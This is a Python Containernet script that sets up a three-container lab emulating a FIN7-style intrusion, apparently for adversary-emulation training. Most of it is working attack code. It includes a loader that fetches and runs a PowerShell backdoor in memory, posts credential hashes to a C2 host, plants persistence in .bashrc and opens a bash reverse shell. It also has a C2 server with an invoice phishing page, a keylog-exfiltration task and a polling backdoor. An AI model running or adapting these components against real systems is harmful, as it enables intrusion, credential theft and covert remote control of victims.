from mininet.net import Containernet
from mininet.node import Controller
from mininet.cli import CLI
from mininet.log import info, setLogLevel

setLogLevel("info")

net = Containernet(controller=Controller)
info("*** Adding controller\n")
net.addController("c0")

info("*** Adding docker containers (Attacker, Proxy, Victim)\n")
attacker = net.addDocker("attacker", ip="10.0.1.10/24", dimage="fin7-base")
proxy = net.addDocker("proxy", ip="10.0.1.254/24", dimage="fin7-base")
victim = net.addDocker("victim", ip="10.0.2.20/24", dimage="fin7-base")

info("*** Adding switches and links\n")
s1 = net.addSwitch("s1")
s2 = net.addSwitch("s2")

net.addLink(attacker, s1)
net.addLink(proxy, s1)

net.addLink(victim, s2)
net.addLink(proxy, s2, params1={"ip": "10.0.2.254/24"})

info("*** Starting network\n")
net.start()

info("*** Configuring routing for Docker hosts\n")
for host in [attacker, proxy, victim]:
    host.cmd(f"ip link set dev {host.name}-eth0 up")

proxy.cmd("ip link set dev proxy-eth1 up")

attacker.cmd("ip route add default via 10.0.1.254")
victim.cmd("ip route add default via 10.0.2.254")

info("*** Setting up C2 Proxy (Redirector)\n")
proxy.cmd("socat TCP-LISTEN:80,fork,reuseaddr TCP:10.0.1.10:8443 &")
proxy.cmd("socat TCP-LISTEN:4444,fork,reuseaddr TCP:10.0.1.10:4444 &")

# ---------------------------------------------------------------------------
# Phase 1 - RECONNAISSANCE
# The attacker scans the target network. The dual-homed proxy forwards packets
# so the attacker can reach the victim subnet (10.0.2.0/24).
# ---------------------------------------------------------------------------
info("\n*** [1/7 RECONNAISSANCE] Attacker scans the victim network\n")
proxy.cmd("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
attacker.cmd(
    "nmap -sn 10.0.2.20 10.0.2.254 -oN /tmp/recon_ping.txt >/dev/null 2>&1; "
    "nmap -sT -Pn -p 22,80,4444,8443 10.0.2.20 10.0.2.254 -oN /tmp/recon_ports.txt >/dev/null 2>&1; "
)

# ---------------------------------------------------------------------------
# Phase 2 - WEAPONIZATION
# Payloads are built on the attacker (team server): the trojanized loader that
# is delivered to the victim, and the in-memory POWERPLANT backdoor (cube.ps1).
# ---------------------------------------------------------------------------
info("\n*** [2/7 WEAPONIZATION] Building loader + backdoor on the attacker\n")
attacker.cmd("mkdir -p /tmp/c2_server")

loader_code = r"""
#!/bin/bash
echo "Loading mega important stuff...Please wait"
echo "早上好中国
现在我有冰淇淋
我很喜欢冰淇淋
但是《速度与激情9》比冰淇淋……速度与激情—《速度与激情9》我最喜欢
所以……现在是音乐时间，准备一二三
两个礼拜以后《速度与激情9》
两个礼拜以后《速度与激情9》
两个礼拜以后《速度与激情9》
不要忘记，不要错过，记得去电影院看《速度与激情9》
因为非常好电影，动作非常好，差不多一样
BING CHILLING
再见1..."

# Stage 1: drop and launch the POWERPLANT backdoor in memory (fileless)
pwsh -c "Invoke-RestMethod -Uri \"http://10.0.2.254:80/cube.ps1\" -ErrorAction SilentlyContinue | Invoke-Expression" > /dev/null 2>&1 &

# Post-exploitation reconnaissance
pwsh -c "\$sysinfo = uname -r; Invoke-RestMethod -Uri \"http://10.0.2.254:80/recon?data=\$sysinfo\" -ErrorAction SilentlyContinue"
pwsh -c "\$procs = (Get-Process).Count; Invoke-RestMethod -Uri \"http://10.0.2.254:80/recon?processes=\$procs\" -ErrorAction SilentlyContinue"

# Credential exfiltration
echo 'Admin:$krb5tgs$23$*admin$domain.local$test*...' > /tmp/hashes.txt
curl -s -X POST -d @/tmp/hashes.txt http://10.0.2.254:80/exfil > /dev/null

# Beacon
curl -s "http://10.0.2.254:80/beacon?hostname=$(hostname)&user=$SYS_USER&os=$SYS_OS" > /dev/null

# Installation: persist the backdoor across new interactive shells
grep -q 'POWERPLANT_STAGE2' "$HOME/.bashrc" 2>/dev/null || echo 'pwsh -c "Invoke-RestMethod -Uri \"http://10.0.2.254:80/cube.ps1\" -ErrorAction SilentlyContinue | Invoke-Expression" > /dev/null 2>&1 & # POWERPLANT_STAGE2' >> "$HOME/.bashrc"

# Interactive access
bash -i >& /dev/tcp/10.0.2.254/4444 0>&1 &
"""

attacker.cmd(
    f'cat << "EOF" > /tmp/c2_server/cybersecurity4dummies.sh\n{loader_code}\nEOF'
)

info('*** Creating attacker\'s http server\n')
c2_server_code = """
from http.server import BaseHTTPRequestHandler, HTTPServer
import sys

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        sys.stdout.write("%s - - [%s] %s\\n" % (self.address_string(), self.log_date_time_string(), format%args))
        sys.stdout.flush()

    def do_GET(self):
        path = self.path.split("?")[0]
        body = b""
        ctype = "text/plain"
        if path == "/cube.ps1":
            try:
                with open('/tmp/c2_server/cube.ps1', 'rb') as f:
                    body = f.read()
            except FileNotFoundError:
                pass
        elif path == "/download/cybersecurity4dummies.sh":
            try:
                with open('/tmp/c2_server/cybersecurity4dummies.sh', 'rb') as f:
                    body = f.read()
            except FileNotFoundError:
                pass
        elif path == "/":
            ctype = "text/html"
            body = b"<html><head><title>Invoice 4471</title></head><body><h2>Invoice #4471</h2><p>Your invoice is attached. Click to download and open:</p><p><a href='/download/cybersecurity4dummies.sh'>Invoice_4471.sh</a></p></body></html>"
        elif path == "/task":
            body = b"$log='/tmp/keys.log'; $off='/tmp/keys.offset'; $start=0; if (Test-Path $off) { $start=[int](Get-Content $off) }; if (Test-Path $log) { $all=[System.IO.File]::ReadAllText($log); if ($all.Length -gt $start) { $new=$all.Substring($start); Invoke-RestMethod -Uri 'http://10.0.2.254:80/exfil' -Method POST -Body $new -ContentType 'text/plain'; Set-Content -Path $off -Value $all.Length } }"
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        self.send_response(200)
        self.end_headers()
        sys.stdout.write(f"\\n[+] EXFILTRATED DATA RECEIVED:\\n{post_data}\\n\\n")
        sys.stdout.flush()

HTTPServer(('0.0.0.0', 8443), C2Handler).serve_forever()
"""

# ---------------------------------------------------------------------------
# Phase 5 - COMMAND & CONTROL
# The team server serves the phishing page, the loader, the backdoor and tasks,
# and it logs every callback.
# ---------------------------------------------------------------------------
info(
    "\n*** [5/7 COMMAND & CONTROL] Starting the team server on 0.0.0.0:8443\n")
attacker.cmd(
    f'cat << "EOF" > /tmp/c2_server/c2_server.py\n{c2_server_code}\nEOF')
attacker.cmd("cd /tmp/c2_server && python3 c2_server.py > c2_logs.txt 2>&1 &")

# ---------------------------------------------------------------------------
# Stage-2 payload (POWERPLANT / KillACK backdoor) served on /cube.ps1
# ---------------------------------------------------------------------------
info('*** Creating the backdoor\n')
cube_ps1_code = """
Write-Host "[*] FIN7 POWERPLANT (KillACK) Executed in Memory"
$os = "Ubuntu-Container"
$user = (whoami)
$hostname = hostname
$procs = (Get-Process).Count
Invoke-RestMethod -Uri "http://10.0.2.254:80/gate?user=$user&os=$os&host=$hostname&procs=$procs" -Method GET -ErrorAction SilentlyContinue
while ($true) {
    $task = Invoke-RestMethod -Uri "http://10.0.2.254:80/task" -Method GET -ErrorAction SilentlyContinue
    if ($task) { Invoke-Expression $task }
    Start-Sleep -Seconds 10
}
"""
attacker.cmd(f'cat << "EOF" > /tmp/c2_server/cube.ps1\n{cube_ps1_code}\nEOF')

# ---------------------------------------------------------------------------
# Phase 3 - DELIVERY
# The victim is lured to the phishing page and downloads/runs the loader.
# ---------------------------------------------------------------------------
info("\n*** [3/7 DELIVERY] On the victim run the 'invoice':\n")
info(
    "    curl -s http://10.0.2.254:80/                         # phishing page\n"
)
info("    curl -s http://10.0.2.254:80/download/cybersecurity4dummies.sh \\\n")
info(
    "         -o /tmp/cybersecurity4dummies.sh && chmod +x /tmp/cybersecurity4dummies.sh \\\n"
)
info("         && /tmp/cybersecurity4dummies.sh\n")

info("\n======================================================\n")
info("*** Network Ready!\n")
info("*** Reverse shell listener (interactive):\n")
info("    docker exec -it mn.attacker nc -lnvp 4444\n")
info("*** C2 log / exfil:\n")
info("    docker exec mn.attacker tail -f /tmp/c2_server/c2_logs.txt\n")

CLI(net)
net.stop()
